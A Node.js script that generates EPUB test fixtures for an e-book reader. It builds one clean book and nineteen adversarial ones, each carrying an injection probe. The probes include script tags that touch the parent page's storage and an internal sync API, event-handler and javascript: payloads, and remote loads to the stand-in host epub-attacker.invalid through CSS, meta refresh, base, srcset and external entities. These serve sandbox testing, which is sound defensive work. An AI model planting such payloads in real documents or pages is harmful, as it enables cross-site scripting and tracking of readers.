import JSZip from 'jszip';
import { mkdir, writeFile, copyFile } from 'node:fs/promises';
JSZip.defaults.date = new Date('2026-01-01T00:00:00Z');
const directory = new URL('../public/fixtures/', import.meta.url);
await mkdir(directory, { recursive: true });
await copyFile(new URL('../../../_test_files/alice.epub', import.meta.url), new URL('alice.epub', directory));
const probes = {
  script: '<script>parent.localStorage.setItem("epub-pwned","yes");fetch("/api/ko/syncs/progress")</script>',
  module: '<script type="module" src="https://epub-attacker.invalid/module.js"></script>',
  event: '<img src="pixel.png" onerror="parent.document.body.dataset.pwned=1"/>',
  svg: '<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><script>alert(1)</script></svg>',
  javascript: '<a href="javascript:parent.location=\'https://epub-attacker.invalid/\'">escape</a>',
  base: '<base href="https://epub-attacker.invalid/"/>',
  refresh: '<meta http-equiv="refresh" content="0;url=https://epub-attacker.invalid/"/>',
  refreshcase: '<META HTTP-EQUIV="refresh" content="0;url=https://epub-attacker.invalid/"/>',
  xmlstyle: '<?xml-stylesheet href="https://epub-attacker.invalid/style.css" type="text/css"?>',
  frame: '<iframe src="/api/ko/syncs/progress"></iframe>',
  form: '<form action="/api/ko/syncs/progress"><input name="x"/></form>',
  remote: '<img src="https://epub-attacker.invalid/track"/>',
  sameorigin: '<img src="/api/ko/syncs/progress"/>',
  css: '<style>@import "https://epub-attacker.invalid/a.css";p{background:url(https://epub-attacker.invalid/track)}</style>',
  cssescape: '<style>p{background:u\\72l(https://epub-attacker.invalid/track)}</style>',
  cssimageset: '<style>p{background-image:image-set("https://epub-attacker.invalid/track" 1x)}</style>',
  outbound: '<a href="https://epub-attacker.invalid/" target="_top">escape</a>',
  srcset: '<img src="pixel.png" srcset="https://epub-attacker.invalid/track 2x"/>',
  entity: '<!ENTITY probe SYSTEM "https://epub-attacker.invalid/">'
};
async function make(name, attack = '') {
  const zip = new JSZip();
  zip.file('mimetype', 'application/epub+zip', { compression: 'STORE' });
  zip.file('META-INF/container.xml', '<?xml version="1.0"?><container version="1.0" xmlns="urn:oasis:names:tc:opendocument:xmlns:container"><rootfiles><rootfile full-path="book.opf" media-type="application/oebps-package+xml"/></rootfiles></container>');
  zip.file('book.opf', '<?xml version="1.0"?><package xmlns="http://www.idpf.org/2007/opf" version="3.0" unique-identifier="id"><metadata xmlns:dc="http://purl.org/dc/elements/1.1/"><dc:identifier id="id">m2-synthetic</dc:identifier><dc:title>M2 synthetic</dc:title><dc:language>en</dc:language><meta property="dcterms:modified">2026-01-01T00:00:00Z</meta></metadata><manifest><item id="nav" href="nav.xhtml" media-type="application/xhtml+xml" properties="nav"/><item id="one" href="one.xhtml" media-type="application/xhtml+xml"/><item id="two" href="two.xhtml" media-type="application/xhtml+xml"/><item id="pixel" href="pixel.png" media-type="image/png"/></manifest><spine><itemref idref="one"/><itemref idref="two"/></spine></package>');
  zip.file('nav.xhtml', '<html xmlns="http://www.w3.org/1999/xhtml" xmlns:epub="http://www.idpf.org/2007/ops"><head><title>TOC</title></head><body><nav epub:type="toc"><ol><li><a href="one.xhtml">One</a></li><li><a href="two.xhtml">Two</a></li></ol></nav></body></html>');
  const paragraphs = Array.from({ length: 100 }, (_, i) => `<p id="p${i}">Paragraph ${i}. ${'Alice follows the rabbit through the quiet garden and reads a curious book. '.repeat(8)}</p>`).join('');
  for (const chapter of ['one', 'two']) zip.file(`${chapter}.xhtml`, `<html xmlns="http://www.w3.org/1999/xhtml"><head><title>${chapter}</title>${attack}</head><body><h1>${chapter}</h1>${paragraphs}<div><p>Repeated nested tag</p><p><a href="#image"><img id="image" src="pixel.png" alt="pixel"/></a></p></div></body></html>`);
  zip.file('pixel.png', 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mP8/x8AAwMCAO+/b9sAAAAASUVORK5CYII=', { base64: true });
  await writeFile(new URL(`${name}.epub`, directory), await zip.generateAsync({ type: 'nodebuffer', compression: 'DEFLATE' }));
}
await make('synthetic');
for (const [name, attack] of Object.entries(probes)) await make(`adversarial-${name}`, attack);
await writeFile(new URL('attacks.json', directory), JSON.stringify(Object.keys(probes), null, 2) + '\n');
console.log(`Copied public Alice fixture; generated synthetic plus ${Object.keys(probes).length} adversarial EPUBs`);
